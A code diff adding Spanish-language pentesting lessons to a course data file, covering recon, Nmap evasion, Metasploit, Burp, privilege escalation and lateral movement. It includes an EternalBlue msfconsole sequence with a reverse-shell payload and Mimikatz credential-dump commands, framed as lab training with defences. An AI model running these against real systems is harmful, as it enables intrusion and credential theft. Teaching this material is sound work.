@@ -2,7 +2,7 @@ import type { Lesson } from "./types";
 
 // Lecciones extendidas. Cada una pertenece a un módulo (sub: "MX") y se puede
 // renderizar con renderMarkdown() en lib/securities/cybersec/markdown.ts.
-// Cobertura: M1-M24 + M51, M53, M54, M55.
+// Cobertura: M1-M33 + M51, M53, M54, M55.
 export const LESSONS: Lesson[] = [
   {
     id: 1,
@@ -338,6 +338,114 @@ export const LESSONS: Lesson[] = [
       { h: "CSRF", c: "🎭 **CSRF** (Cross-Site Request Forgery) — Engaña al navegador de una víctima autenticada para que ejecute una acción no deseada (transferir dinero, cambiar email) usando su sesión.\n\nFunciona porque el navegador adjunta cookies automáticamente.\n\n✅ **Defensa:**\n→ **Tokens anti-CSRF** únicos por sesión/request (AlphaLog usa cookie al_csrf + header x-csrf-token)\n→ Cookies **SameSite=Lax/Strict**\n→ Verificar Origin/Referer en mutaciones" },
       { h: "SSRF e IDOR", c: "🎯 **SSRF** — Forzar al servidor a pedir URLs internas o metadata cloud (169.254.169.254). Ya visto en OWASP A10 (Capital One). Defensa: allowlist, bloquear rangos internos.\n\n🔢 **IDOR** (Insecure Direct Object Reference) — Acceder a objetos ajenos cambiando un identificador (/invoice/1001 → /invoice/1002). Defensa: verificar **autorización por objeto** en el servidor (no confiar en el ID del cliente). En AlphaLog, RLS de Supabase lo previene a nivel DB." },
       { h: "File Upload", c: "📎 Las subidas de archivos mal validadas permiten:\n→ Subir un **webshell** (shell.php) y ejecutarlo → RCE\n→ Bypass por Content-Type falso o doble extensión (shell.php.jpg)\n→ Path traversal en el nombre (../../)\n→ XSS vía SVG/HTML, zip bombs (DoS)\n\n✅ **Defensa:** validar tipo por contenido (magic bytes) no por extensión, renombrar archivos, almacenar fuera del webroot o en storage dedicado, límites de tamaño, escaneo AV." },
+    ],
+  },
+  {
+    id: 29,
+    title: "Reconocimiento y OSINT",
+    sub: "M25",
+    dur: "35m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Pasivo vs Activo", c: "🔍 El **reconocimiento** es la primera fase de un pentest (mapea la superficie de ataque).\n→ **Pasivo** — Sin tocar al objetivo: fuentes públicas (OSINT). Indetectable.\n→ **Activo** — Interactúa con el objetivo (escaneo, banner grabbing). Genera tráfico/logs.\n\nSiempre empezás pasivo para no alertar antes de tiempo." },
+      { h: "OSINT y Herramientas", c: "🌐 **OSINT** = Open Source Intelligence.\n→ **Google Dorking** — site:, filetype:, intitle:, inurl: para encontrar archivos y paneles expuestos\n→ **whois / dig** — Datos de dominio y DNS\n→ **Shodan / Censys** — Buscadores de dispositivos y servicios expuestos en Internet\n→ **theHarvester** — Emails, subdominios, hosts\n→ **amass / subfinder** — Enumeración de subdominios\n→ **Maltego** — Visualización de relaciones (personas, dominios, infra)" },
+      { h: "Qué Buscás", c: "📋 Información valiosa en recon:\n→ Subdominios y rangos de IP\n→ Tecnologías (Wappalyzer, headers)\n→ Emails y empleados (LinkedIn) → ingeniería social\n→ Credenciales filtradas (HaveIBeenPwned, dumps)\n→ Repos públicos con secretos (GitHub dorking)\n→ Documentos con metadata (autores, software)\n\nTodo esto alimenta las fases siguientes (escaneo, explotación, phishing)." },
+    ],
+  },
+  {
+    id: 30,
+    title: "Escaneo con Nmap",
+    sub: "M26",
+    dur: "40m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Tipos de Escaneo", c: "🛰️ **Nmap** descubre hosts, puertos y servicios.\n→ **-sn** — Ping sweep (qué hosts están vivos)\n→ **-sS** — SYN scan (sigiloso, half-open, requiere root)\n→ **-sT** — TCP connect (sin root, más ruidoso)\n→ **-sU** — UDP scan (lento, para DNS/SNMP)\n→ **-p-** — Todos los 65535 puertos · **-p 80,443** — Específicos\n→ **-F** — Fast (top 100 puertos)" },
+      { h: "Detección y NSE", c: "🔬 Profundizar:\n→ **-sV** — Versión de servicios (clave para buscar CVEs)\n→ **-O** — Detección de sistema operativo\n→ **-A** — Agresivo (sV + O + scripts + traceroute)\n\n📜 **NSE** (Nmap Scripting Engine):\n→ --script=vuln — Detecta vulnerabilidades conocidas\n→ --script=smb-enum-shares, http-enum, ssl-enum-ciphers\n\nEjemplo: nmap -sS -sV -p- -A 10.0.0.5" },
+      { h: "Evasión", c: "🥷 Para evadir IDS/firewalls (en engagements autorizados):\n→ **-f** — Fragmentar paquetes\n→ **-D RND:10** — Decoys (IPs señuelo)\n→ **-S** — Spoofear IP origen\n→ **--source-port 53** — Aparentar tráfico DNS\n→ **-T0/-T1** — Timing lento (menos detectable)\n→ **--data-length** — Cambiar tamaño de paquete\n\n⚠️ El escaneo sin autorización es ilegal. Solo en labs o con permiso escrito." },
+    ],
+  },
+  {
+    id: 31,
+    title: "Enumeración de Servicios",
+    sub: "M27",
+    dur: "35m",
+    diff: "Intermedio",
+    sections: [
+      { h: "El Arte de Enumerar", c: "🔎 La **enumeración** extrae información detallada de cada servicio encontrado. El dicho del pentester: \"enumeration is key\" — cuanto más enumerás, más vectores encontrás.\n\nFlujo: puerto abierto → identificar servicio/versión → enumerar a fondo → buscar exploits." },
+      { h: "Por Servicio", c: "🗂️ **SMB (445/139)** — enum4linux, smbclient -L, smbmap (shares, usuarios, políticas)\n🌐 **DNS (53)** — dig axfr (zone transfer), dnsenum\n📟 **SNMP (161/udp)** — snmpwalk con community 'public' (¡a menudo expone todo!)\n📂 **LDAP (389)** — ldapsearch (usuarios, grupos de AD)\n🔌 **FTP (21)** — login anónimo, banner\n🌍 **HTTP (80/443)** — gobuster/feroxbuster (directorios), nikto, whatweb\n📧 **SMTP (25)** — VRFY/EXPN para enumerar usuarios" },
+      { h: "Herramientas Clave", c: "🧰 **enum4linux-ng** — Enumeración integral de Windows/Samba\n🧰 **rpcclient** — Consultas RPC a Windows\n🧰 **gobuster / ffuf** — Fuzzing de directorios y subdominios\n🧰 **nikto** — Scanner de webservers\n🧰 **crackmapexec / nxc** — Enumeración masiva en redes Windows\n\n💡 Documentá TODO: cada credencial, share, versión y endpoint suma para la fase de explotación." },
+    ],
+  },
+  {
+    id: 32,
+    title: "Análisis de Vulnerabilidades",
+    sub: "M28",
+    dur: "30m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Scanners", c: "🩺 Los **vulnerability scanners** correlacionan servicios/versiones con bases de CVEs:\n→ **Nessus** — Comercial, el estándar de la industria\n→ **OpenVAS / Greenbone** — Open source\n→ **nuclei** — Rápido, basado en templates (muy usado en bug bounty)\n→ **nmap --script vuln** — Básico pero útil\n\nDetectan: software desactualizado, misconfigs, credenciales por defecto, certificados débiles." },
+      { h: "CVE y CVSS", c: "📊 **CVE** — Identificador único de una vulnerabilidad (CVE-2021-44228).\n📈 **CVSS** — Score de severidad 0-10. Métricas base v3.1:\n→ **AV** Attack Vector (Network/Adjacent/Local/Physical)\n→ **AC** Attack Complexity · **PR** Privileges Required · **UI** User Interaction\n→ **S** Scope · **C/I/A** impacto en Confidencialidad/Integridad/Disponibilidad\n\nEj: 9.8 (Critical) suele ser AV:N/AC:L/PR:N/UI:N con impacto total." },
+      { h: "Priorización", c: "🎯 No todo CVE importa igual. Priorizá por:\n→ **Severidad** (CVSS) **+ explotabilidad** (¿hay exploit público? ¿está en CISA KEV?)\n→ **Exposición** (¿es accesible desde Internet?)\n→ **Criticidad del activo**\n\n⚠️ Cuidado con **falsos positivos**: validá manualmente antes de reportar. Un scanner es un punto de partida, no la verdad absoluta." },
+    ],
+  },
+  {
+    id: 33,
+    title: "Metasploit Framework",
+    sub: "M29",
+    dur: "40m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Arquitectura", c: "🧨 **Metasploit** es el framework de explotación más usado. Módulos:\n→ **exploits** — Aprovechan una vulnerabilidad\n→ **payloads** — Lo que se ejecuta tras explotar (shell, meterpreter)\n→ **auxiliary** — Scanners, fuzzers, brute force\n→ **post** — Post-explotación\n→ **encoders** — Ofuscar payloads\n\nDos tipos de payload: **staged** (x/y) descarga en partes, **stageless** monolítico." },
+      { h: "Flujo en msfconsole", c: "💻 Workflow típico:\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nexploit\n\n→ **show options** lista parámetros requeridos\n→ **sessions -l** lista sesiones activas\n→ **msfvenom** genera payloads standalone fuera de msfconsole" },
+      { h: "Meterpreter y Post", c: "🐚 **Meterpreter** es un payload avanzado en memoria:\n→ sysinfo, getuid, ps, migrate (a otro proceso)\n→ hashdump (dump de hashes), getsystem (escalada)\n→ download/upload, screenshot, keyscan\n→ **portfwd / route** — Pivoting hacia redes internas\n\nPracticá en labs legales: **Metasploitable**, HackTheBox, TryHackMe. Nunca contra sistemas sin autorización." },
+    ],
+  },
+  {
+    id: 34,
+    title: "Burp Suite",
+    sub: "M30",
+    dur: "35m",
+    diff: "Intermedio",
+    sections: [
+      { h: "Proxy e Intercept", c: "🕷️ **Burp Suite** es EL proxy para testing de aplicaciones web. Se sitúa entre tu navegador y el servidor para ver/modificar todo el tráfico.\n\n**Setup:** configurás el navegador para usar Burp como proxy (127.0.0.1:8080) + instalás su certificado CA para ver HTTPS.\n\n**Intercept** — Pausa cada request para inspeccionarlo o editarlo antes de enviarlo. **HTTP history** registra todo." },
+      { h: "Herramientas Clave", c: "🔁 **Repeater** — Reenvía y modifica un request manualmente (probar inyecciones, IDOR)\n💥 **Intruder** — Automatiza ataques: fuzzing, brute force, enumeración (payloads + posiciones)\n🔬 **Scanner** (Pro) — Detección automática de vulns\n🗺️ **Target/Sitemap** — Mapa de la aplicación\n🔢 **Decoder / Comparer** — Codificar/decodificar, comparar respuestas\n🧩 **Sequencer** — Analiza aleatoriedad de tokens" },
+      { h: "Flujo de Testing", c: "📋 Metodología típica con Burp:\n1. Navegar la app con intercept → poblar el sitemap\n2. Identificar parámetros e inputs\n3. Repeater para probar SQLi/XSS/IDOR manualmente\n4. Intruder para fuzzing y enumeración\n5. Revisar headers, cookies, CSRF tokens\n\n🎓 **PortSwigger Web Security Academy** (gratis) tiene cientos de labs para practicar con Burp legalmente." },
+    ],
+  },
+  {
+    id: 35,
+    title: "Escalada de Privilegios: Linux",
+    sub: "M31",
+    dur: "40m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Enumeración Local", c: "⬆️ Tras obtener un shell de bajo privilegio, buscás llegar a **root**. Primero, enumerar:\n→ **LinPEAS / LinEnum** — Scripts que automatizan la búsqueda\n→ id, sudo -l, uname -a (versión de kernel)\n→ Procesos, cron, archivos SUID, capabilities, montajes\n\nLa escalada casi siempre viene de una **mala configuración**, no de un 0day." },
+      { h: "Vectores Comunes", c: "🔓 **SUID/SGID** — Binarios con bit SUID abusables (ver **GTFOBins**)\n🔓 **sudo misconfig** — sudo -l revela binarios ejecutables como root (vim, find, less → shell)\n🔓 **Cron jobs** — Scripts root editables o con wildcards explotables\n🔓 **PATH hijacking** — Un script root llama un binario sin ruta absoluta\n🔓 **Capabilities** — getcap -r / (cap_setuid)\n🔓 **Credenciales** — En configs, .bash_history, archivos del mundo legibles" },
+      { h: "Kernel y Contenedores", c: "💥 **Kernel exploits** — Si el kernel es viejo (uname -a), buscás exploits (Dirty COW, Dirty Pipe). Riesgoso: puede tumbar el sistema.\n📦 **Container escape** — Contenedores mal configurados (privileged, docker.sock montado, capabilities excesivas) permiten escapar al host.\n\n🛡️ **Defensa:** parchear kernel, mínimo SUID, sudo restrictivo, no montar docker.sock, AppArmor/SELinux, auditd." },
+    ],
+  },
+  {
+    id: 36,
+    title: "Escalada de Privilegios: Windows",
+    sub: "M32",
+    dur: "40m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Enumeración", c: "⬆️ El objetivo es pasar de usuario a **SYSTEM/Administrator**. Enumerá con:\n→ **WinPEAS / PowerUp / Seatbelt**\n→ whoami /priv (privilegios del token), whoami /groups\n→ systeminfo (parches faltantes), tareas programadas, servicios\n\nWindows tiene su propio set de misconfigs explotables." },
+      { h: "Vectores Comunes", c: "🎫 **Token impersonation** — Privilegios como SeImpersonatePrivilege → familia **Potato** (JuicyPotato, PrintSpoofer, GodPotato)\n⚙️ **Servicios vulnerables:**\n→ **Unquoted service path** — Ruta con espacios sin comillas\n→ **Weak service permissions** — Podés modificar el binario/config\n→ **AlwaysInstallElevated** — Instala MSIs como SYSTEM\n📁 **DLL hijacking** — Colocar una DLL maliciosa en la ruta de búsqueda\n🔑 Credenciales en registro, GPP (cpassword), SAM/LSASS (Mimikatz)" },
+      { h: "Exploits Conocidos", c: "🖨️ **PrintNightmare** (CVE-2021-34527) — RCE/privesc vía el spooler de impresión\n💥 **Potato family** — Abusan COM/NTLM relay para escalar de servicio a SYSTEM\n🩸 **Mimikatz** — Dump de credenciales en memoria (sekurlsa::logonpasswords)\n\n🛡️ **Defensa:** parcheo, LSA Protection/Credential Guard, mínimo privilegio, comillas en service paths, deshabilitar AlwaysInstallElevated, LAPS para passwords de admin local." },
+    ],
+  },
+  {
+    id: 37,
+    title: "Pivoting y Movimiento Lateral",
+    sub: "M33",
+    dur: "40m",
+    diff: "Avanzado",
+    sections: [
+      { h: "Concepto", c: "🔀 Tras comprometer un host, lo usás como **trampolín** para alcanzar redes a las que no tenías acceso directo (ej: pasar de la DMZ a la red interna).\n\n→ **Pivoting** — Enrutar tráfico a través del host comprometido\n→ **Lateral movement** — Moverte entre hosts dentro de la red" },
+      { h: "Túneles y Forwarding", c: "🚇 Técnicas de tunneling:\n→ **SSH** — -L (local forward), -R (remote), -D (SOCKS proxy dinámico)\n→ **proxychains** — Encadena tu tráfico por el proxy SOCKS\n→ **chisel** — Túneles sobre HTTP/WebSocket (bypassa firewalls)\n→ **ligolo-ng** — Pivoting moderno con interfaz TUN\n→ **sshuttle** — VPN ad-hoc sobre SSH\n→ Meterpreter: portfwd + route + autoroute" },
+      { h: "Movimiento Lateral", c: "🏃 Una vez con credenciales/hashes, te movés a otros hosts:\n→ **PsExec / smbexec** — Ejecución remota vía SMB\n→ **WMI / wmiexec** — Ejecución vía WMI\n→ **WinRM / evil-winrm** — Shell remota (5985/5986)\n→ **Pass-the-Hash** — Autenticar con el hash NTLM sin la password\n→ **RDP** (3389)\n\n🛡️ **Defensa:** segmentación de red, deshabilitar SMBv1, monitoreo de 4624/4648, LAPS, tiering de admins, desactivar NTLM donde se pueda." },
     ],
   },
 ];
